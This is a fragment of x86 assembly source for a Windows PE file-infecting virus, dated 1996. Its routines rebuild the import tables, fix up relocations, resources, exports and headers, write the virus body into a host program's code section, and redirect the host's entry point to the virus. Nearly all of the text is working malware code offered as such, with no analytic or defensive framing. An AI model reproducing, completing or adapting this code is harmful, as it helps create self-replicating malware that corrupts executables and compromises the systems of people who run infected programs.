;(C) 1996 American Eagle Publications, Inc. All rights reserved.

;This function builds the necessary import data for the virus to import basic
;operating system functions. To do this, it:
;       1. Makes room in the IID array for more entries, as needed.
;       2. Sets up some ranges so that relocation vectors can be adjusted, as
;          necessary later on.
;       3. Inserts the import data for the virus.
;       4. Sets up the JMPTBL address.
;
BUILD_IMPORT_DATA:
        lea     ebx,[edi+SEC_IDATA]
        call    FIND_SEC_HDR            ;find the .idata section
        or      ebx,ebx
        jnz     BID1                    ;no .idata section found, just exit
        ret                             ;exit if no idata section found

BID1:   mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        push    ebx                     ;save section pointer
        mov     [ebp+TEMP],eax          ;save file pointer here
BID2:   mov     eax,[ebp+TEMP]
        add     DWORD PTR [ebp+TEMP],IID_SIZE
        call    FILE_SEEK               ;and go there
        mov     ecx,IID_SIZE            ;read the Image Import Descriptor record
        lea     edx,[ebp+IID]           ;into IID
        call    FILE_READ
        cmp     DWORD PTR [ebp+IID],0   ;is Characteristics @ zero?
        jnz     BID2                    ;nope, read another

        sub     DWORD PTR [ebp+TEMP],IID_SIZE   ;readjust this to point to first 0 entry
        pop     ebx                     ;restore section pointer
        mov     eax,[ebp+TEMP]          ;set everything up to move data
        mov     ecx,eax                 ;ecx = source
        add     eax,IMPORT_DLLS*IID_SIZE;eax = destination
        mov     edx,[ebp+ebx+16]        ;get size of raw data
        sub     edx,ecx
        add     edx,[ebp+ebx+20]        ;subtract size of IID array, edx=amt to move
        push    ebx
        call    MSNL                    ;move data
        pop     ebx

;Now room has been made for IMPORT_DLLS IID's in the IID array. They shoud be
;placed at [TEMP] when written to the file. Before doing that, we set some
;stuff up to adjust relocations that refer to these imports.

        mov     eax,[ebp+ebx+12]        ;virtual address of idata start
        add     eax,[ebp+TEMP]
        sub     eax,[ebp+ebx+20]        ;add size of IID array, which didnt move
        mov     [ebp+LO_IDATA],eax      ;save it here
        mov     eax,[ebp+ebx+12]        ;virtual address of idata start
        add     eax,[ebp+ebx+16]        ;add size of data to get rva of idata end
        mov     [ebp+HI_IDATA],eax      ;and save it here

;Update the section header to reflect change in size for new IIDs.

        add     DWORD PTR [ebp+ebx+8],IMPORT_DLLS*IID_SIZE

;Now it's time to build the data that goes in the idata area.

        push    edi
        push    esi
        add     edi,OFFSET INAME_TABLE          ;edi points to iname table
        lea     esi,[ebp+FILEBUF]               ;esi points to buffer
        xchg    esi,edi                         ;switch them
        mov     ecx,OFFSET INAME_TABLE_END - OFFSET INAME_TABLE
        rep     movsb                           ;put the name strings in FILEBUF
        lea     esi,[ebp+FILEBUF]               ;esi points to string of names
        mov     eax,[ebp+ebx+12]                ;get virtual @ of start of idata
        add     eax,[ebp+ebx+16]                ;add SizeRawData to get rva of end of idata
        add     eax,IMPORT_DLLS*IID_SIZE
        sub     eax,esi                         ;eax changes @ in FILEBUF to rva
        mov     ecx,eax                         ;save it here
        mov     DWORD PTR [ebp+RELBUF],4        ;set up a counter for building JMPTBL

BID3:   mov     al,[esi]                        ;check for end of name table
        or      al,al
        jz      BID4
        call    BUILD_IID                       ;build IID and associated strucs
        jmp     BID3                            ;for one DLL
                                ;now all the import data is in FILEBUF
BID4:   mov     ecx,edi
        pop     esi
        pop     edi
        push    ecx
        mov     eax,[ebp+ebx+20]
        add     eax,IMPORT_DLLS*IID_SIZE
        add     eax,[ebp+ebx+16]                ;eax=where to put the data
        push    ebx
        call    FILE_SEEK
        pop     ebx
        lea     eax,[ebp+FILEBUF]
        pop     ecx
        sub     ecx,eax                         ;ecx=bytes to write
        add     ecx,[ebp+ebx+16]
        add     ecx,IMPORT_DLLS*IID_SIZE
        mov     eax,ecx
        call    GET_MSIZE
        mov     [ebp+ebx+8],eax
        mov     [ebp+esi+132],ecx               ;update size in ImageDataDirectory too!
        mov     eax,ecx
        sub     ecx,[ebp+ebx+16]                ;ecx=bytes to write again
        call    GET_FSIZE
        mov     [ebp+ebx+16],eax                ;update SizeOfRawData
        lea     edx,[ebp+FILEBUF]               ;place to write from
        call    FILE_WRITE                      ;write it to file
                                        ;now just set up JMPTBL properly
        mov     eax,[ebp+esi+40]                ;entry point
        add     eax,OFFSET JMPTBL - OFFSET VIRUS;get rva of JMPTBL
        call    RVA_TO_FILEPTR
        call    FILE_SEEK                       ;seek there
                                        ;now adjust values for JMPTBL
BID5:   sub     DWORD PTR [ebp+RELBUF],4        ;decrement table pointer
        mov     ebx,[ebp+RELBUF]
        or      ebx,ebx                         ;all done?
        jz      BID6                            ;yes, go update generation
        mov     eax,[ebp+esi+40]                ;get entry point for host
        sub     eax,OFFSET VIRUS                ;subtract compiler entry point, eax=host edi(NR)
        sub     [ebp+ebx+RELBUF],eax            ;save result here
        jmp     BID5                            ;go do another

BID6:   mov     ecx,[edi+GENERATION]            ;also get generation
        inc     ecx                             ;and increment it
        mov     [ebp+RELBUF+4+4*IMPORT_DLLS],ecx

        lea     edx,[ebp+RELBUF+4]              ;now write JMPTBL to file
        mov     ecx,4+4*IMPORT_DLLS
        call    FILE_WRITE

        ret

;This subroutine builds one IID in IID and the associated data structures in
;FILEBUF. It is passed the @ of the DLL in the string table in esi, and a pointer
;to the first unused byte in FILEBUF in edi.
BUILD_IID:                              ;first build IID
        mov     eax,esi
        add     eax,ecx
        mov     [ebp+IID+12],eax                ;save rva of DLL name
        mov     eax,edi
        add     eax,ecx
        mov     [ebp+IID],eax                   ;rva of Characteristics array
        xor     eax,eax
        mov     [ebp+IID+4],eax                 ;save date/time=0
;        dec     eax
        mov     [ebp+IID+8],eax                 ;save forwarder chain = 0

BIID1:  lodsb                                   ;index esi past DLL name
        or      al,al
        jnz     BIID1
        xor     eax,eax
        lodsw                                   ;get number of imported functions
        inc     eax
        shl     eax,2                           ;calculate size of characteristics, FirstThunk
        mov     edx,eax                         ;save it here
        add     eax,edi
        add     eax,ecx
        mov     [ebp+IID+16],eax                ;save rva of FirstThunk array
        push    ebx                             ;now set up JMPTBL
        mov     ebx,[ebp+RELBUF]
        mov     [ebp+ebx+RELBUF],eax            ;save rva here
        add     DWORD PTR [ebp+RELBUF],4        ;and update the counter
        pop     ebx

                                ;now write the IID to the file
        push    ebx
        push    ecx
        push    edx
        push    edi
        mov     edi,[esp+24]
        mov     eax,[ebp+TEMP]                  ;write it here
        call    FILE_SEEK
        lea     edx,[ebp+IID]
        mov     ecx,IID_SIZE
        call    FILE_WRITE
        add     DWORD PTR [ebp+TEMP],IID_SIZE   ;and update IID pointer
        pop     edi
        pop     edx
        pop     ecx
        pop     ebx

                                ;now set up arrays, zipping through functions
BIID2:  mov     eax,esi                         ;position of hint/name in FILEBUF
        add     eax,ecx                         ;make an rva out of it
        mov     [edi],eax                       ;save in characteristics
        mov     [edi+edx],eax                   ;save in first thunk
        add     edi,4                           ;edi points to next entry
        lodsw                                   ;read hint
        lodsb                                   ;read first byte of function name
        or      al,al                           ;zero?
        jz      BIID4                           ;yes, done with fctns for this DLL
BIID3:  lodsb                                   ;else index past rest of fctn name
        or      al,al
        jnz     BIID3
        jmp     BIID2                           ;and go handle another function
BIID4:  xor     eax,eax                         ;zero last entry in tables
        mov     [edi-4],eax
        mov     [edi+edx-4],eax
        add     edi,edx                         ;move edi up past FirstThunk
        ret                                     ;and exit

;******************************************************************************
;This routine updates the image data directory in the PE header so that all
;of the vectors point to the right places if sections have been moved.
UPDATE_IMG_DAT_DIR:
        mov     ecx,[ebp+esi+116]       ;get # entries in image data directory
        dec     ecx
        mov     ebx,ecx
        shl     ebx,3
        add     ebx,esi
        add     ebx,120                 ;ebx points to last IDD entry
UIDDL:  mov     eax,[ebp+ebx]           ;get entry
        call    ADJUST_RVA              ;adjust as necessary
        mov     [ebp+ebx],eax           ;and save it
        or      ecx,ecx
        jz      UIDDR
        dec     ecx
        sub     ebx,8
        jmp     UIDDL
UIDDR:  ret

;******************************************************************************
;This routine updates the IMAGE_RESOURCE_DATA_ENTRY pointers to the resources
;in the resource section
UPDATE_RESOURCES:
        lea     ebx,[edi+SEC_RSRC]
        call    FIND_SEC_HDR            ;find the .rsrc section
        or      ebx,ebx
        jz      US3                     ;no resource section found, just exit
        mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        mov     [ebp+TEMP],eax          ;save it here
        lea     ebx,[ebp+FILEBUF]       ;point to start of FILEBUF
        call    PROCESS_RES_DIR         ;process resource root directory (recursive)
US3:    ret                             ;ok, all done

;This routine processes the resource directory pointed to in the file by eax,
;and which has a memory location reserved for it at ebx.
PROCESS_RES_DIR:
        push    ebx
        call    FILE_SEEK               ;and go there
        pop     edx
        push    edx                     ;get load location in edx
        mov     ecx,16                  ;read 16 bytes to start with
        call    FILE_READ               ;load start of Image Resource Directory
        pop     ebx                     ;prep to read actual directory entries
        xor     ecx,ecx
        mov     cx,[ebx+12]             ;ecx=# of named entries
        add     cx,[ebx+14]             ;# of named + # of id entries
        push    ecx
        push    ebx
        shl     ecx,3                   ;multiply by 8
        lea     edx,[ebx+16]            ;read right after the dir header
        call    FILE_READ               ;now we've read the entire directory
        pop     ebx
        pop     ecx                     ;ecx=# of directory entries
        or      ecx,ecx                 ;check for zero
        jz      PRD3                    ;and just exit if so
        shl     ecx,3                   ;multiply by 8 to form index
PRDL:   sub     ecx,8
        push    ecx
        mov     eax,[ecx+ebx+16+4]      ;get OffsetToData
        and     eax,7FFFFFFFH           ;eax = distance from start of .rsrc to dir entry
        add     eax,[ebp+TEMP]          ;add distance to start of .rsrc
        xor     edx,edx
        mov     dx,[ebx+12]             ;ecx=# of named entries
        add     dx,[ebx+14]             ;# of named + # of id entries
        shl     edx,3                   ;multiply by 8
        add     edx,16                  ;and add size of directory header
        push    ebx
        test    [ecx+ebx+16+4],80000000H   ;Another directory or resource?
        jz      PRD1                    ;go handle resource
        add     ebx,edx                 ;ebx=memory pointer to put subdir in
        call    PROCESS_RES_DIR         ;recursively handle subdirectory
        jmp     PRD2
PRD1:   add     ebx,edx                 ;ebx=memory pointer to put subdir in
        call    PROCESS_RES_DATA        ;else go process resource data entry
PRD2:   pop     ebx
        pop     ecx
        or      ecx,ecx
        jnz     PRDL                    ;if more left to process, go do them
PRD3:   ret

;This routine processes an Image Resource Data Entry structure. It's the main
;thing that the virus needs to deal with in order to handle resources properly,
;since it contains an rva to the actual resource, and this rva must be updated.
;When called, it is passed the file offset where the data entry structure is
;located in eax, and a memory area it can load it into in ebx.
PROCESS_RES_DATA:
        push    eax
        push    ebx
        call    FILE_SEEK               ;seek to data entry structure
        pop     edx
        push    edx                     ;prep to read it to allocated memory
        mov     ecx,12                  ;size of structure
        call    FILE_READ
        pop     ebx
        pop     eax
        push    ebx
        call    FILE_SEEK               ;seek back to start of data entry
        pop     edx
        mov     eax,[edx]
        call    ADJUST_RVA              ;update rva as necessary
        cmp     eax,[edx]               ;did it change?
        je      PRDX                    ;nope, just carry on, don't write it
        mov     [edx],eax               ;update the rva in the data entry struct
        mov     ecx,4
        call    FILE_WRITE              ;update the rva to file
PRDX:   ret


;******************************************************************************
;This routine updates all of the imports in the file which need to be changed
;as a result of moving sections to make room for the virus.
UPDATE_IMPORTS:
        lea     ebx,[edi+SEC_IDATA]
        call    FIND_SEC_HDR            ;find the .idata section
        or      ebx,ebx
        jnz     UI2                     ;no .idata section found, just exit
        ret                             ;exit if no reloc section found

;Ok, we found the .idata section, now we must read through it and update the
;data.
UI2:    mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        mov     [ebp+TEMP],eax          ;save file pointer here
UI3:    mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;and go there
        mov     ecx,20                  ;read the Image Import Descriptor record
        lea     edx,[ebp+IID]           ;into IID
        call    FILE_READ

        mov     eax,[ebp+IID]           ;get the Characteristics @ for this block
        or      eax,eax                 ;zero?
        jz      UI4                     ;yes, done reading
        call    ADJUST_RVA              ;nope, adjust as necessary
        add     eax,IMPORT_DLLS*IID_SIZE;must adjust all rva's in idata by this too
        mov     [ebp+IID],eax           ;and update it
        mov     eax,[ebp+IID+12]        ;now adjust rva for DLL name
        call    ADJUST_RVA
        add     eax,IMPORT_DLLS*IID_SIZE;must adjust all rva's in idata by this too
        mov     [ebp+IID+12],eax        ;update it if needed
        mov     eax,[ebp+IID+16]        ;now adjust rva of Image_Import_By_Name structure
        call    ADJUST_RVA
        add     eax,IMPORT_DLLS*IID_SIZE;must adjust all rva's in idata by this too
        mov     [ebp+IID+16],eax        ;update if necessary
        mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;go back to IID record
        mov     ecx,20
        lea     edx,[ebp+IID]
        call    FILE_WRITE              ;and write record back to file
UI35:   add     DWORD PTR [ebp+TEMP],20 ;update current file pointer
        mov     eax,[ebp+IID]           ;update the first ImageImportByName structure
        sub     eax,IMPORT_DLLS*IID_SIZE;re-adjust back to find it for now
        or      eax,eax                 ;borland leaves this structure unfilled
        jz      UI36                    ;so skip it in this case
        call    UPDATE_IIBN
UI36:   mov     eax,[ebp+IID+4]         ;see if this file has been bound
        or      eax,eax
        jnz     UI3                     ;yes, don't update next IIBN
        mov     eax,[ebp+IID+16]        ;FirstThunk ImageImportByName structure
        sub     eax,IMPORT_DLLS*IID_SIZE;re-adjust back to find it for now
        call    UPDATE_IIBN             ;this one is always used
        jmp     UI3                     ;and go do another
UI4:    ret                             ;all done, exit

;This updates an ImageImportByName structure whose rva is pointed to by eax
;upon entry. It moves all of the rva's as necessary to point to the proper
;name info for the imports.
UPDATE_IIBN:
        call    RVA_TO_FILEPTR          ;make a file pointer out of the rva
        push    eax
        call    FILE_SEEK               ;now go there
        mov     ecx,4096
        lea     edx,[ebp+FILEBUF]
        call    FILE_READ               ;read the import hint/name pointer table
        xor     ebx,ebx                 ;use ebx to point into table
UIIBNL: mov     eax,[ebp+ebx+FILEBUF]   ;get an array element
        or      eax,eax                 ;are we done?
        jz      UIIBN2                  ;yes, go update to file
        test    eax,80000000H           ;an ordinal import??
        jnz     UIIBN1                  ;yes, this is not an rva
        call    ADJUST_RVA
        add     eax,IMPORT_DLLS*IID_SIZE;must adjust all rva's in idata by this too
UIIBN1: mov     [ebp+ebx+FILEBUF],eax   ;and store in memory again
        add     ebx,4                   ;and go to next element
        jmp     UIIBNL
UIIBN2: pop     eax                     ;go back to IIBN
        push    ebx                     ;save bytes to write
        call    FILE_SEEK
        pop     ecx
        lea     edx,[ebp+FILEBUF]
        call    FILE_WRITE              ;write IIBN back to disk
        ret

;******************************************************************************
;This routine updates the relocation vectors in the .reloc section so that
;any which have moved will again point to the proper areas. This involves
;updating both the relocation vectors and updating the actual relocatables
;themselves. This process is carried out in two separate steps.
UPDATE_RELOCATIONS:
        lea     ebx,[edi+SEC_RELOC]
        call    FIND_SEC_HDR            ;find the .reloc section
        or      ebx,ebx
        jnz     UR2                     ;no reloc section found, just exit
        ret                             ;exit if no reloc section found

;Ok, we found the reloc section, now we must read through it and update the
;relocatables themselves.
UR2:    mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        mov     [ebp+TEMP],eax          ;save file pointer here
        push    eax                     ;save the pointer for later use too
UR3:    mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;and go there
        mov     ecx,8                   ;read the Image Base Relocation record
        lea     edx,[ebp+IBR]           ;into IBR
        call    FILE_READ
        mov     eax,[ebp+IBR]           ;get the VirtualAddress for this block
        or      eax,eax                 ;zero?
        jz      UR4                     ;yes, done reading
        call    ADJUST_RVA              ;else adjust it as necessary
        cmp     eax,[ebp+IBR]
        je      UR35                    ;no adjust made, don't write back to file
        mov     [ebp+IBR],eax           ;adjusted, update it in memory
        mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;go back to IBR record
        mov     ecx,8
        lea     edx,[ebp+IBR]
        call    FILE_WRITE              ;and write record back to file

UR35:   mov     eax,[ebp+IBR+4]         ;get size of Image Base Relocation record
        add     [ebp+TEMP],eax          ;update current file pointer
        jmp     UR3                     ;and go do another

;Now the relocation tables have been updated. The next step is to go back
;and go to all of the relocation vectors in the code and the data and update
;them if they point to data areas that have been moved. (No code has been
;moved by the virus.)
UR4:
        pop     eax                     ;eax=start of .reloc section
        mov     [ebp+TEMP],eax          ;file pointer is here
UR45:   mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;so go there
        call    PROCESS_BLOCK           ;process a block of relocation ptrs
        jnz     UR45                    ;do another, until done
        ret

;This routine process one block of relocatables, as defined by the Image Base
;Relocation records. It assumes that the current file pointer points to a valid
;block. If the VirtualAddress is zero, the block is invalid and the procedure
;returns with Z set.
PROCESS_BLOCK:
        mov     ecx,8
        lea     edx,[ebp+IBR]
        call    FILE_READ               ;read Image Base Relocation header
        mov     ecx,[ebp+IBR+4]         ;get size of whole IBR record
        or      ecx,ecx                 ;all done?
        jz      PBR                     ;if zero, exit with Z set
        add     [ebp+TEMP],ecx          ;update rel ptr table
        sub     ecx,8                   ;size of relocations alone
        lea     edx,[ebp+RELBUF]        ;read relocations into RELBUF
        call    FILE_READ
        mov     eax,[ebp+IBR]           ;get VirtualAddress for relocations
        call    RVA_TO_FILEPTR          ;convert rva to file offset in eax
        push    eax                     ;save it here
        call    FILE_SEEK               ;go there
        mov     ecx,4099                ;read 1 page+3 bytes
        lea     edx,[ebp+FILEBUF]       ;into file buffer
        call    FILE_READ
        pop     eax
        call    FILE_SEEK               ;go back to this page
        mov     ebx,[ebp+IBR+4]
        sub     ebx,8                   ;ebx points to end of relocation vectors
PB1:    sub     ebx,2                   ;next reloc vector
        push    ebx
        mov     ax,[ebp+ebx+RELBUF]
        cwde                            ;eax is 12-bit reloc vector + flags
        test    eax,0000F000H           ;check flags
        jz      PB2                     ;a dummy entry, ignore it
        and     eax,00000FFFH           ;good entry, mask flags
        lea     ebx,[ebp+FILEBUF]
        add     ebx,eax                 ;eax points to the relocatable in FILEBUF
        mov     eax,[ebx]               ;eax is the relocatable
        sub     eax,[ebp+esi+52]        ;subtract image base
        call    ADJUST_RVA
        cmp     eax,[ebp+LO_IDATA]      ;check for special import adjustments
        jc      PB15                    ;not in range, continue
        cmp     eax,[ebp+HI_IDATA]
        jnc     PB15                    ;not in range, continue
        add     eax,IMPORT_DLLS*IID_SIZE;adjust for IID table modifications
PB15:   add     eax,[ebp+esi+52]
        mov     [ebx],eax               ;save adjusted value
PB2:    pop     ebx
        or      ebx,ebx                 ;is ebx=0?
        jnz     PB1                     ;no, go do another
        mov     ecx,4096                ;all done relocating things
        lea     edx,[ebp+FILEBUF]       ;now write the data back to the file
        call    FILE_WRITE
        mov     al,1
        or      al,al                   ;reset z on successful exit
PBR:    ret

;******************************************************************************
;This procedure updates all RVAs in the exported data section of the PE file.
;Many times exports don't even need updating because they are values in the
;code section. However, to play it safe, all exports must be checked.
UPDATE_EXPORTS:
        lea     ebx,[edi+SEC_EDATA]
        call    FIND_SEC_HDR            ;find the .edata section
        or      ebx,ebx
        jnz     UE2                     ;if no edata section found, just exit
        ret

;Ok, we found the .edata section, now we must read through it and update the
;data.
UE2:    mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        mov     [ebp+TEMP],eax          ;and save it here
        call    FILE_SEEK               ;go there
        lea     edx,[ebp+RELBUF]        ;and load Image Export Directory to RELBUF
        mov     ecx,40
        call    FILE_READ
        mov     eax,[ebp+RELBUF+12]     ;update the "Name" address
        call    ADJUST_RVA
        mov     [ebp+RELBUF+12],eax
        mov     eax,[ebp+RELBUF+28]     ;update the AddressOfFunctions address
        call    ADJUST_RVA
        mov     [ebp+RELBUF+28],eax
        mov     eax,[ebp+RELBUF+32]     ;update the AddressOfNames address
        call    ADJUST_RVA
        mov     [ebp+RELBUF+32],eax
        mov     eax,[ebp+RELBUF+36]     ;update the AddressOfNameOrdinals address
        call    ADJUST_RVA
        mov     [ebp+RELBUF+36],eax
        mov     eax,[ebp+TEMP]          ;and save the Image Export Directory here
        call    FILE_SEEK
        lea     edx,[ebp+RELBUF]
        mov     ecx,40
        call    FILE_WRITE

        mov     eax,[ebp+RELBUF+28]     ;now update the array of rva's AddressOfFunctions
        mov     ecx,[ebp+RELBUF+20]     ;number of elements in array
        call    UPDATE_ARRAY
        mov     eax,[ebp+RELBUF+32]     ;and the AddressOfNames array
        mov     ecx,[ebp+RELBUF+24]     ;number of elements in array
        call    UPDATE_ARRAY
        ret                             ;all done

;This updates an array of rva's located at the rva in eax, with ecx elements
;in the array. The array should not be more than 1000 elements in length.
UPDATE_ARRAY:
        push    ecx
        call    RVA_TO_FILEPTR          ;make a file pointer out of the RVA
        pop     ecx
        push    ecx
        push    eax
        push    ecx
        call    FILE_SEEK               ;go find the array
        pop     ecx
        shl     ecx,2                   ;convert to a byte count
        lea     edx,[ebp+FILEBUF]       ;read it in here
        call    FILE_READ
        pop     eax
        call    FILE_SEEK               ;re-position file pointer for later write
        pop     ecx
        push    ecx                     ;ecx=# elements in array
        lea     ebx,[ebp+FILEBUF]
UAL:    mov     eax,[ebx]               ;update an element
        call    ADJUST_RVA
        mov     [ebx],eax
        dec     ecx
        add     ebx,4
        or      ecx,ecx
        jnz     UAL                     ;and loop until done
        pop     ecx                     ;update the array in the file
        shl     ecx,2
        lea     edx,[ebp+FILEBUF]
        call    FILE_WRITE
        ret                             ;and exit


;******************************************************************************
;This routine writes the body of the virus to the first code section, and
;adjusts the jump so that the virus will pass control to the host when it is
;finished executing.
INSERT_VIRUS_CODE:
        xor     ecx,ecx
        call    GET_SEC_PTR             ;ebx points to section hdr where virus goes
        push    ebx
        mov     eax,[ebp+ebx+20]        ;eax=pointer to raw data
        add     eax,[ebp+ebx+16]        ;add size of raw data
        push    eax
        call    FILE_SEEK               ;and seek to here in the file
        mov     ecx,VIR_SIZE
        lea     edx,[edi+OFFSET VIRUS]
        call    FILE_WRITE              ;write the virus to the file
        pop     eax

        add     eax,OFFSET HADDR - OFFSET VIRUS + 1
        call    FILE_SEEK               ;seek to jump address in file

        pop     ebx                     ;ebx = pointer to section header
        push    ebx
        mov     eax,[ebp+esi+40]        ;get old entry point
        mov     ecx,[ebp+ebx+12]        ;virtual address of section
        add     ecx,[ebp+ebx+16]        ;add rounded up size, ecx=new entry pt
        mov     [ebp+esi+40],ecx        ;save new entry pt here
        add     ecx,OFFSET HADDR + 5 - OFFSET VIRUS
        sub     eax,ecx                 ;eax = relative jump value
        mov     [ebp+TEMP],eax          ;save it here

        mov     ecx,4                   ;write 4 bytes
        lea     edx,[ebp+TEMP]          ;from here
        call    FILE_WRITE              ;to adjust jump address in host

        pop     ebx                     ;now adjust section header entries
        mov     eax,[ebp+ebx+16]        ;get size of raw data
        add     eax,VIR_SIZE            ;add size of virus to it
        mov     [ebp+ebx+8],eax         ;set VirtualSize
        call    GET_FSIZE               ;determine new SizeOfRawData
        mov     [ebp+ebx+16],eax        ;and save it
        call    GET_MSIZE
        mov     [ebp+esi+28],eax        ;update CodeSize in PE header too

        mov     eax,[ebp+ebx+12]        ;get Virtual Address of code section
        cmp     [ebp+esi+48],eax        ;is BaseOfData<VirtualAddress?
        jc      IVR                     ;yes, don't update it
        mov     eax,VIR_SIZE            ;else proceed with update
        call    GET_VMSIZE              ;determine amount to update
        add     [ebp+esi+48],eax        ;update BaseOfData in PE header
        add     [ebp+esi+80],eax        ;update ImageSize in PE header
        call    GET_IMSIZE
        add     [ebp+esi+80],eax        ;add idata increase to ImageSize too
        mov     eax,WORKSP              ;update stack commit size
        add     eax,4096
        call    GET_MSIZE
        cmp     eax,[ebp+esi+100]       ;better be at least eax big!
        jc      IV1
        mov     [ebp+esi+100],eax
IV1:    cmp     eax,[ebp+esi+108]       ;do the same for heap commit size
        jc      IVR
        mov     [ebp+esi+108],eax
IVR:    ret                             ;all done

;******************************************************************************
;This routine updates the PE header and the section headers in the host to
;properly reflect the changes made to the file by the virus. Since they have
;already been modified by MOVE_SECTIONS and INSERT_VIRUS to reflect the
;infection, all that is needed is to write the PE header and section headers
;to the file.
UPDATE_PE_HEADER:
        mov     eax,esi
        sub     eax,HDRBUF              ;eax = offset of PE header in file
        call    FILE_SEEK               ;seek to proper place

        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;# of section headers to ecx
        mov     eax,SEC_SIZE            ;size of section header
        mul     ecx                     ;size of section headers
        mov     ecx,PE_SIZE             ;size of PE header
        add     ecx,eax                 ;ecx=amount to write
        lea     edx,[ebp+esi]           ;address to write from
        call    FILE_WRITE              ;update PE header
        ret


;******************************************************************************
;This routine finds the last section in the host file which is an executable
;code section. It returns the number of that section in eax. If no executable
;code section is found, it returns with c set. (Though that's really a
;preposterous situation.
FIND_LAST_EXEC:
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;ecx=number of sections in the file
FLELP:  dec     ecx
        push    ecx
        call    GET_SEC_PTR             ;pointer to section hdr to ebx
        test    [ebp+ebx+9*4],20000000H ;executable?
        jz      FLE1                    ;nope, continue
        pop     eax                     ;yes, put section number found in eax
        inc     eax
        clc                             ;clear carry
        ret                             ;and exit
FLE1:   pop     ecx
        or      ecx,ecx
        jnz     FLELP
        stc
        ret

